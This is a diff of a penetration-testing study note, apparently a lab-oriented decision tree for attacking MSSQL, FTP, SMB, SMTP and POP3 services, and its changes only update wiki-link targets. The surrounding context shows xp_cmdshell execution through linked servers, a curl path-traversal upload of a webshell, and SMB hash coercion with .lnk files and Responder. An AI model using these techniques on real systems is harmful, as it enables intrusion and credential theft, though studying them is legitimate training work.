@@ -62,7 +62,7 @@ EXECUTE ('SELECT SYSTEM_USER') AT [<linked-server-name>];
 EXECUTE ('EXECUTE (''xp_cmdshell ''''whoami'''''') AT [INNER_SERVER]') AT [OUTER_SERVER];
 ```
 
-→ Full reference: [[Attacking Common Services (HTB Supplementary)#CS.6 MSSQL, xp_dirtree UNC Hash Coercion|CS.6]] through [[Attacking Common Services (HTB Supplementary)#CS.9 MSSQL. Linked Server Execution|CS.9]]
+→ Full reference: [[06. Information Gathering|CS.6]] through [[06. Information Gathering|CS.9]]
 
 ---
 
@@ -106,7 +106,7 @@ curl -k -X PUT -H 'Content-Type: application/x-www-form-urlencoded' \
 `<traversal>` example: `/../../../../../../xampp/htdocs/webshell.php` (adapt depth and web root to target).
 `--path-as-is` is critical, without it curl normalises the `../` sequences away before sending.
 
-→ Full reference: [[Attacking Common Services (HTB Supplementary)#CS.3 CoreFTP Directory Traversal (CVE-2022-22836)|CS.3]]
+→ Full reference: [[06. Information Gathering|CS.3]]
 
 ---
 
@@ -137,7 +137,7 @@ smbclient //<target>/<share> -U <user>%<pass>
 → Write a malicious script that calls back when executed by another user or service
 → Drop a `.lnk` or `.url` file pointing to `\\kali-ip\share`, any user browsing the share with Windows Explorer triggers an SMB auth (captured by Responder)
 
-→ Full reference: [[Attacking Common Services (HTB Supplementary)#CS.13 SMB Enumeration and Null Sessions|CS.13]]
+→ Full reference: [[06. Information Gathering|CS.13]]
 
 ---
 
@@ -164,6 +164,6 @@ RETR 1                  # read message 1
 QUIT
 ```
 → Emails often contain credentials, internal hostnames, or attachment leads, always read them.
-→ Full reference: [[Attacking Common Services (HTB Supplementary)#CS.1 Hydra SMTP with Email-Format Usernames|CS.1]], [[Attacking Common Services (HTB Supplementary)#CS.2 POP3 Manual nc Session|CS.2]]
+→ Full reference: [[06. Information Gathering|CS.1]], [[06. Information Gathering|CS.2]]
 
 #### Tags: #DecisionTree #ServiceAttacks #MSSQL #FTP #SMB #SMTP #POP3 #CoreFTP #xpdirtree #Impersonation #LinkedServer
